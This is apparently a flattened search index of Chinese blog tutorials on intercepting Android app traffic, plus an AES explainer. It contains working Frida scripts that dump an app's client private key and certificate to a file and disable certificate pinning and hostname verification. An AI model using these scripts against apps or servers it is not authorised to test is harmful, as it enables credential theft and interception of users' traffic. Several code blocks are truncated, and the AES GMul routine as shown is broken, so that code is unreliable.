","date":"2022-06-22","objectID":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/:4:3","tags":["刷机和Root"],"title":"移动设备环境准备","uri":"/posts/android/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E5%A4%87%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"},{"categories":["Android 抓包"],"content":"双向校验案例 ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:0:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"案例Apk NCSearch.apk ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:1:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"服务端校验客户端 ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"现象 配置好Charles抓包环境并完成浏览器百度访问测试. 对App进行抓包. 观察上述response数据,发现有\"400 No required SSL certificate was sent\"提示信息,是说服务端未接收到所需要的SSL证书信息,也就是说服务端对客户端进行了证书校验. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:1","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"寻找服务端信任证书 当App未使用VPN代理时对服务器进行访问,服务器是能够正常返回数据的,说明App在与服务器进行通信的过程中是使用服务器端信任的证书与服务器进行数据交互的,因此服务器端信任的证书一定会在App发起通信之前从资源文件中加载进来,那么只需将Apk进行解包使用下述命令进行搜索. //通常来搜索 .p12 .bks .truststore tree -NCfhl |grep -i .p12 当前也有一些App,会通过改名、加密等方式将证书隐藏起来,遇到这种情况,可以通过Hook的手段快速定位(这里可以参考下r0capture的代码). 需要注意的是,执行下述Hook代码前,需要先将手机中的VPN代理关掉.因为该App还有客户端校验服务端的代码. function uuid(len, radix) { var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split(''); var uuid = [], i; radix = radix || chars.length; if (len) { // Compact form for (i = 0; i \u003c len; i++) uuid[i] = chars[0 | Math.random() * radix]; } else { // rfc4122, version 4 form var r; // rfc4122 requires these characters uuid[8] = uuid[13] = uuid[18] = uuid[23] = '-'; uuid[14] = '4'; // Fill in random data. At i==19 set the high bits of clock sequence as // per rfc4122, sec. 4.1.5 for (i = 0; i \u003c 36; i++) { if (!uuid[i]) { r = 0 | Math.random() * 16; uuid[i] = chars[(i == 19) ? (r \u0026 0x3) | 0x8 : r]; } } } return uuid.join(''); } function main(){ Java.perform(function(){ function storeP12(pri, p7, p12Path, p12Password) { var X509Certificate = Java.use(\"java.security.cert.X509Certificate\") var p7X509 = Java.cast(p7, X509Certificate); var chain = Java.array(\"java.security.cert.X509Certificate\", [p7X509]) var ks = Java.use(\"java.security.KeyStore\").getInstance(\"PKCS12\", \"BC\"); ks.load(null, null); ks.setKeyEntry(\"client\", pri, Java.use('java.lang.String').$new(p12Password).toCharArray(), chain); try { var out = Java.use(\"java.io.FileOutputStream\").$new(p12Path); ks.store(out, Java.use('java.lang.String').$new(p12Password).toCharArray()) console.log(\"dump success!\") } catch (exp) { console.log(exp) } } //在服务器校验客户端的情形下，帮助dump客户端证书，并保存为p12的格式，证书密码为LuoHun Java.use(\"java.security.KeyStore$PrivateKeyEntry\").getPrivateKey.implementation = function () { var result = this.getPrivateKey() var packageName = Java.use(\"android.app.ActivityThread\").currentApplication().getApplicationContext().getPackageName(); storeP12(this.getPrivateKey(), this.getCertificate(), '/sdcard/Download/' + packageName + uuid(10, 16) + '.p12', 'LuoHun'); return result; } Java.use(\"java.security.KeyStore$PrivateKeyEntry\").getCertificateChain.implementation = function () { var result = this.getCertificateChain() var packageName = Java.use(\"android.app.ActivityThread\").currentApplication().getApplicationContext().getPackageName(); storeP12(this.getPrivateKey(), this.getCertificate(), '/sdcard/Download/' + packageName + uuid(10, 16) + '.p12', 'LuoHun'); return result; } }) } setImmediate(main) ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:2","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"导出证书 当Frida Hook显示dump success!时,就去手机的/sdcard/Download/将证书导出. adb shell su cd /sdcard/Download/ mkdir luo mv *.p12 luo adb pull /sdcard/Download/luo ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:3","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"Charles导入证书 Import P12证书时,选择上述导出到PC端上的任一证书文件即可,输入密码 LuoHun 这样配置的话,就可将服务端信任的证书导入到Charles中,从而达到了\"欺骗\"服务器的目的. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:4","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"非标转端口添加 这里可以看到,该App使用了非标准端口,在Charles中依次点击 Proxy-\u003eSSL Proxying Settings,在弹出窗口中输入端口号即可. ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:2:5","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"客户端校验服务端 对于客户端校验服务端的Hook代码,可参考github仓库: https://github.com/CreditTone/hooker/blob/master/js/just_trust_me.js function classExists(className) { var exists = false; try { var clz = Java.use(className); exists = true; } catch(err) { //console.log(err); } return exists; }; function loadDexfile(dexfile) { Java.perform(function() { Java.openClassFile(dexfile).load(); //console.log(\"load \" + dexfile); }); }; var loadedXRadar = false; function loadXRadarDexfile() { loadedXRadar = true; loadDexfile('/data/local/tmp/radar.dex'); }; loadXRadarDexfile(); function hasTrustManagerImpl() { return classExists(\"com.android.org.conscrypt.TrustManagerImpl\"); } function newArrayList() { var ArrayListClz = Java.use('java.util.ArrayList'); return ArrayListClz.$new(); } function processOkHttp() { //知道你为什么有时候用JustTrustMe失败吗，因为app代码混淆了下面这些类你改到对应的类和方法就行啦 if (classExists(\"com.squareup.okhttp.CertificatePinner\")) { var squareupOkhttp3CertificatePinnerClz = Java.use('com.squareup.okhttp.CertificatePinner'); var squareupOkhttp3CertificatePinnerClzCheck = squareupOkhttp3CertificatePinnerClz.check.overload('java.lang.String', 'java.util.List'); squareupOkhttp3CertificatePinnerClzCheck.implementation = function(v0, v1) { //什么都不做 console.log(\"com.squareup.okhttp.CertificatePinner.check('java.lang.String', 'java.util.List') was hooked!\"); }; }else{ console.error(\"没找到com.squareup.okhttp.CertificatePinner类，这是android系统自带的类没找到就算求了。不同系统不一样，不用找了!!!\"); } if (classExists(\"okhttp3.CertificatePinner\")) { try { var okhttp3CertificatePinnerClz = Java.use('okhttp3.CertificatePinner'); var okhttp3CertificatePinnerClzCheck = okhttp3CertificatePinnerClz.check.overload('java.lang.String', 'java.util.List'); okhttp3CertificatePinnerClzCheck.implementation = function(v0, v1) { //什么都不做 console.log(\"okhttp3.CertificatePinner.check('java.lang.String', 'java.util.List') was hooked!\"); }; } catch (error) { console.error(\"okhttp3.CertificatePinner的check方法可能被混淆了。你可以jadx反编译下还原回来！\"); } }else{ console.error(\"没找到okhttp3.CertificatePinner类，可能被混淆了。你可以jadx反编译下还原回来！\"); } if (classExists(\"okhttp3.internal.tls.OkHostnameVerifier\")) { try { var OkHostnameVerifierClz = Java.use('okhttp3.internal.tls.OkHostnameVerifier'); var OkHostnameVerifierClzVerify_5791 = OkHostnameVerifierClz.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession'); OkHostnameVerifierClzVerify_5791.implementation = function(v0, v1) { //强制返回true console.log(\"okhttp3.internal.tls.OkHostnameVerifier.verify('java.lang.String', 'javax.net.ssl.SSLSession') was hooked!\"); return true; }; var OkHostnameVerifierVerify_8978 = OkHostnameVerifierClz.verify.overload('java.lang.String', 'java.security.cert.X509Certificate'); OkHostnameVerifierVerify_8978.implementation = function(v0, v1) { //强制返回true console.log(\"okhttp3.internal.tls.OkHostnameVerifier.verify('java.lang.String', 'java.security.cert.X509Certificate') was hooked!\"); return true; }; } catch (error) { console.error(\"okhttp3.internal.tls.OkHostnameVerifier的verify方法可能被混淆了。你可以jadx反编译下还原回来！\"); } }else{ console.error(\"没找到okhttp3.internal.tls.OkHostnameVerifier类，可能被混淆了。你可以jadx反编译下还原回来！\"); } if (classExists(\"okhttp3.OkHttpClient$Builder\")) { try{ var okhttp3_OkHttpClient_Builder_clz = Java.use('okhttp3.OkHttpClient$Builder'); var okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one = okhttp3_OkHttpClient_Builder_clz.sslSocketFactory.overload('javax.net.ssl.SSLSocketFactory'); okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one.implementation = function(sSLSocketFactory) { //把参数替换成EmptySSLFactory var ret = okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_one.call(this, Java.use(\"gz.justtrustme.Helper\").getEmptySSLFactory()); return ret; }; var okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_two = okhttp3_OkHttpClient_Builder_clz.sslSocketFactory.overload('javax.net.ssl.SSLSocketFactory', 'javax.net.ssl.X509TrustManager'); okhttp3_OkHttpClient_Builder_clz_sslSocketFactory_two.implementation = function(sSLSocketFactory, x509TrustManager) { //把参数替换成EmptySSLFactory var ret = o","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:3:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-06-14","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/:4:0","tags":["抓包"],"title":"双向校验案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/%E5%8F%8C%E5%90%91%E6%A0%A1%E9%AA%8C%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"SSL Pinning案例 ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:0:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"案例Apk dida.apk ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:1:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"情景再现 测试抓包环境. PC端使用Charles,手机端使用Postern(Socks模式),PC端和手机端在同一局域网环境下且Charles证书已安装到手机系统分区中,手机端使用浏览器访问百度进行测试. 打开案例App,测试通过手机号注册发送验证码流程. 经过多次测试,发现某些网址的抓包结果总是提示\"Client closed the connection before a request was made. Possibly the SSL certificate was rejected.\",也就说客户端主动停止与服务器的连接,App使用了证书绑定技术. ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:2:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"解决方案 ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"概述 由于上面这种方式对证书验证的代码是写在App内部,所以我们可以通过Hook的方式让执行证书绑定的函数失效.而Hook可行的前提是能够确定证书绑定的函数,此时需要对不同网络框架中证书绑定相关的代码有一定了解.例如,App使用okhttp3网络框架进行证书绑定,那么使用的证书绑定类总是CertificatePinner类,此时Hook的目标就是CertificatePinner类中的函数;App使用TrustManager类完成证书的绑定,那么Hook的目标就是TrustManager类中的证书绑定函数. OkHttpClient client = new OkHttpClient.Builder() //完成证书绑定 .certificatePinner(new CertificatePinner.Builder() .add(\"test.com\", \"sha512/14cf3DRF...\") .build()) .build(); ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:1","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"前人研究 Android世界中有很多的网络框架,如果对每个网络框架都进行证书绑定函数的确定,工作量很大.但幸运的是,前人已经完成了很多种网络框架的证书绑定函数的收集工作,可供我们参考. Objection 考虑到App在启动之前就已经完成了证书绑定,所以我们首先要确保App进程完全关闭,然后利用Objection的-s/–start-command参数达到命令在应用启动之前就执行的效果. objection.exe -g cn.ticktick.task explore -s \"android sslpinning disable\" 从上面结果中可以看到依旧是失败,出现这个问题可能是Objection工具未集成足够多的网络框架证书绑定函数而造成的. DroidSSLUnpinning https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js frida -U -f cn.ticktick.task -l .\\hooks.js --no-pause okhttp-sslunpinning https://github.com/bxl0608/okhttp-sslunpinning var classesNames = new Array() var OkhttpClientClassName = \"\" var CertificatePinnerClassName = \"\" var prefix = \"\" function initConsole(){ var Color = {RESET: \"\\x1b[39;49;00m\", Black: \"0;01\", Blue: \"4;01\", Cyan: \"6;01\", Gray: \"7;11\", \"Green\": \"2;01\", Purple: \"5;01\", Yellow: \"3;01\", Red: \"1;01\"} var LightColor = {RESET: \"\\x1b[39;49;00m\", Black: \"0;11\", Blue: \"4;11\", Cyan: \"6;11\", Gray: \"7;01\", \"Green\": \"2;11\", Purple: \"5;11\", Red: \"1;11\", Yellow: \"3;11\"} var colorPrefix = '\\x1b[3' var colorSuffix = 'm' Object.keys(Color).forEach(function(c){ if (c == \"RESET\") return console[c] = function(message){ console.log(colorPrefix + Color[c] + colorSuffix + message + Color.RESET) } console[\"Light\" + c] = function(message){ console.log(colorPrefix + LightColor[c] + colorSuffix + message + Color.RESET) } }) } function loadOkhttpClient(){ Java.perform(function (){ try{ Java.use(\"okhttp3.OkHttpClient\") }catch(e){ //console.error(e) } }) } function loadClasses(){ Java.perform(function (){ Java.enumerateLoadedClasses({ onMatch: function(clsName, handle){ classesNames.push(clsName) }, onComplete: function(){ console.Green(\"Search Class Completed!\") } }) }) } function findOkhttpClass(){ Java.perform(function (){ var Modifier = Java.use(\"java.lang.reflect.Modifier\") function isOkhttpClient(clsName){ if(clsName.split('.').length != 2){ return false; } try{ var cls = Java.use(clsName) var interfaces = cls.class.getInterfaces() const count = interfaces.length if(count \u003c 2){ return false } var flag = false for(var i = 0; i \u003c count; i++){ var interface_ = interfaces[i] var interface_name = interface_.getName() if(interface_name.indexOf(\"Cloneable\") \u003e 0){ flag = true }else{ if(interface_name.indexOf(\"$\") \u003c= 0){ return false } } } if(!flag) return false; if(cls.class.getDeclaredClasses().length \u003c 1){ return false } if(cls.class.getSuperclass().getName() != 'java.lang.Object'){ return false } }catch(e){ return false } return true; } function isCertificatePinner(clsName,prefix){ if(!clsName.startsWith(prefix)){ return false } if(clsName.indexOf(\"$\") \u003e 0){ return false } if(clsName.split('.').length != 2){ return false; } var cls = Java.use(clsName) if(cls.class.isInterface()){ return false } if(cls.class.getInterfaces().length \u003e 0){ return false } if(cls.class.getDeclaredClasses().length \u003c 1){ return false } if(cls.class.getSuperclass().getName() != \"java.lang.Object\"){ return false } if(!Modifier.isFinal(cls.class.getModifiers())){ return false } var flag = false var methods = cls.class.getDeclaredMethods() for(var i = 0; i \u003c methods.length; i++){ var method = methods[i] if(method.getParameterCount() \u003c 1){ continue } if(method.getParameterTypes()[0].getName() == \"java.security.cert.Certificate\"){ flag = true break } } if(!flag) return false flag = false var fields = cls.class.getDeclaredFields() for(var k = 0; k \u003c fields.length; k++){ var field = fields[k]; if(field.getType().getName() == \"java.util.Set\"){ flag = true break } } if(!flag) return false return true } for(var i = 0; i \u003c classesNames.length; i++){ if(isOkhttpClient(classesNames[i])){ OkhttpClientClassName = classesNames[i] var prefix = classesNames[i].split('.')[0]+'.' } } for(var i = 0; i \u003c classesNames.length; i++){ if(isCertificatePinner(classesNames[i],prefix)){ CertificatePinnerClassName = classesNames[i] } } var printOut if(OkhttpClientClassName == \"\" || CertificatePinnerClassName == \"\" || prefix == \"\"){ printOut = console.Red printOut(\"C","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:2","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"常规思路 在经过上述前人总结的2种方案都失败后,可以得到一个结论:App被混淆了.这种情况下,有两种思路可以借鉴: 使用Objection对所有Http字符串相关类进行Hook,定位关键的证书绑定函数. 考虑到App在验证证书时一定会打开证书文件判断是否是App自身信任的,因此一定会使用File类的构造函数打开证书文件获得文件句柄,故我们可以Hook File类的构造函数,即File$init函数.(推荐) 这里我们使用第2种方案,确保App完全关闭,然后利用Objection完成注入.需要注意的是,在终端中\"$“是特殊字符,需要进行转义. objection.exe -g cn.ticktick.task explore -s \"android hooking watch class_method java.io.File.'$'init --dump-args --dump-backtrace --dump-return\" 接下来以/system/etc/security/cacerts这个系统存放证书的路径为关键词在终端进行搜索,就会发现有一个栈的信息中存在非常明显的CertificatePinner.java文件名信息,因此可以判定函数z1.g.a()就是对应的完成证书绑定的函数. ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:3","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"Hook脚本 function killCertificatePinner(){ Java.perform(function(){ console.log(\"Beginning killCertificatePinner !...\") Java.use(\"z1.g\").a.implementation = function(str,list){ console.log(\"called z1.g.a ~\") return ; } }) } function main(){ killCertificatePinner(); } setImmediate(main); ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:4","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:4:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["加密算法"],"content":"AES ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:0:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"算法描述 在AES算法中密钥长度、分组长度和轮数的对应关系如下: 密钥长度(Nk个32位双字) 分组长度(Nb个32位双字) 轮数(Nr) AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 对AES算法来说,输入分组、输出分组及状态分组的长度都是128比特,即Nb = 4. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:1:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"加密过程 ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 将输入复制到状态数组中,在进行一次初始轮密钥相加操作之后,执行Nr次轮函数,对状态数组进行变换,其中最后一轮不同于前Nr-1轮.将最终的状态数组复制到输出数组中,即得到最终的密文. 轮函数由4部分组成,分别是subBytes(),shiftRows(),mixColumns(),addRoundKey(). 其加密过程的伪代码如下: //对AES-128加密来说,Nk = 4,Nb = 4,Nr = 10 void AES_XXX_Encrypt(uint8 in[4*Nb], uint8 out[4*Nb], uint8 key[4*Nk]) { //将输入复制到状态数组 uint8 state[4*Nb] = in; //密钥扩展 uint32 dw[Nb*(Nr+1)] = keyExpansion(key[4*Nk]); //轮密相加 addRoundKey(state, dw[0, Nb-1]); for (int round = 1; round \u003c Nr; ++round) { subBytes(state); //字节代换 shiftRows(state); //行移位 mixColumns(state); //列混合 addRoundKey(state, dw[round*Nb, (round+1)*Nb-1]); //轮密相加 dw[4-7],dw[8-11]... } subBytes(state); shiftRows(state); addRoundKey(state, dw[Nr*Nb,(Nr+1)*Nb-1]); out = state; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"密钥扩展(keyExpansion) 通过对用户输入的128位、192位或者256位的密钥进行处理,共生成Nb*(Nr+1)个32位双字,为加解密算法的轮函数提供轮密钥. 其代码表示如下: void XorWords(uint8* a, uint8* b, uint8* c) { int i; for (i = 0; i \u003c 4; i++) { c[i] = a[i] ^ b[i]; } } uint8 xtime(uint8 b) // multiply on x { return (b \u003c\u003c 1) ^ (((b \u003e\u003e 7) \u0026 1) * 0x1b); } void Rcon(uint8* a, int n) { int i; uint8 c = 1; for (i = 0; i \u003c n - 1; i++) { c = xtime(c); } a[0] = c; a[1] = a[2] = a[3] = 0; } void SubWord(uint8* a) { int i; for (i = 0; i \u003c 4; i++) { a[i] = S[a[i] / 16][a[i] % 16]; } } void RotWord(uint8* a) { uint8 c = a[0]; a[0] = a[1]; a[1] = a[2]; a[2] = a[3]; a[3] = c; } //密钥扩展 void KeyExpansion(uint8 key[4 * Nk], uint8 w[4 * Nb * (Nr + 1)]) { uint8* temp = new uint8[4]; uint8* rcon = new uint8[4]; int i = 0; while (i \u003c 4 * Nk) { w[i] = key[i]; i++; } i = 4 * Nk; while (i \u003c 4 * Nb * (Nr + 1)) { temp[0] = w[i - 4 + 0]; temp[1] = w[i - 4 + 1]; temp[2] = w[i - 4 + 2]; temp[3] = w[i - 4 + 3]; if (i / 4 % Nk == 0) { RotWord(temp); SubWord(temp); Rcon(rcon, i / (Nk * 4)); XorWords(temp, rcon, temp); } else if (Nk \u003e 6 \u0026\u0026 i / 4 % Nk == 4) { SubWord(temp); } w[i + 0] = w[i - 4 * Nk] ^ temp[0]; w[i + 1] = w[i + 1 - 4 * Nk] ^ temp[1]; w[i + 2] = w[i + 2 - 4 * Nk] ^ temp[2]; w[i + 3] = w[i + 3 - 4 * Nk] ^ temp[3]; i += 4; } delete[]rcon; delete[]temp; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"字节代换(subBytes) 实际上就是一个简单的查表操作.AES定义了一个16x16字节的S-box,以状态数组中的每个字节元素的高4位为行标,低4位为列标,取出相应的元素作为subBytes操作的结果.例如,16进制值{21},高4位为2,低4位为1,取S-box中行标为2、列表为1的值组成16进制值{FD},则{21}被替换为{FD}. 其代码表示如下: void subBytes(uint8(*state)[4]) { /* i: row, j: col */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { state[i][j] = S[state[i][j]]; } } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"行移位(shiftRows) 状态数组的第1行保持不变,第2行循环左移1字节,第3行循环左移2字节,第4行循环左移3字节.例如,对状态: F6 A6 82 A4 14 8C 48 7F 46 EA 26 19 C1 53 A7 14 进行行移位之后,结果为: F6 A6 82 A4 8C 48 7F 14 26 19 46 EA 14 C1 53 A7 其代码表示如下: //循环左移 void leftLoop4int(uint32 array[4], int step) { uint32 temp[4]; for (int i = 0; i \u003c 4; i++) temp[i] = array[i]; int index = step % 4 == 0 ? 0 : step % 4; for (int i = 0; i \u003c 4; i++) { array[i] = temp[index]; index++; index = index % 4; } } //行移位 void shiftRows(uint8 array[4][4]) { uint32 rowTwo[4], rowThree[4], rowFour[4]; //复制状态矩阵的第2,3,4行 for (int i = 0; i \u003c 4; i++) { rowTwo[i] = array[1][i]; rowThree[i] = array[2][i]; rowFour[i] = array[3][i]; } //循环左移相应的位数 leftLoop4int(rowTwo, 1); leftLoop4int(rowThree, 2); leftLoop4int(rowFour, 3); //把左移后的行复制回状态矩阵中 for (int i = 0; i \u003c 4; i++) { array[1][i] = rowTwo[i]; array[2][i] = rowThree[i]; array[3][i] = rowFour[i]; } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"列混合(mixColumns) 先把状态矩阵初始状态复制一份到tmpArray中,然后将tmpArray与M矩阵相乘,其中M存放的是要乘的常数矩阵数组,GMul函数定义了矩阵相乘时的乘法,加法则直接通过异或来实现. 其代码表示如下: uint8 GMul(uint8 u, uint8 v) { uint8 p = 0; for (int i = 0; i \u003c 8; ++i) { if (u \u0026 0x01) { // p ^= v; } int flag = (v \u0026 0x80); v \u003c\u003c= 1; if (flag) { v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */ } u \u003e\u003e= 1; } return p; } int mixColumns(uint8(*state)[4]) { uint8 tmpArray[4][4]; uint8 M[4][4] = { {0x02, 0x03, 0x01, 0x01}, {0x01, 0x02, 0x03, 0x01}, {0x01, 0x01, 0x02, 0x03}, {0x03, 0x01, 0x01, 0x02} }; /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { tmpArray[i][j] = state[i][j]; } } for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { state[i][j] = GMul(M[i][0], tmpArray[0][j]) ^ GMul(M[i][1], tmpArray[1][j]) ^ GMul(M[i][2], tmpArray[2][j]) ^ GMul(M[i][3], tmpArray[3][j]); } } return 0; } 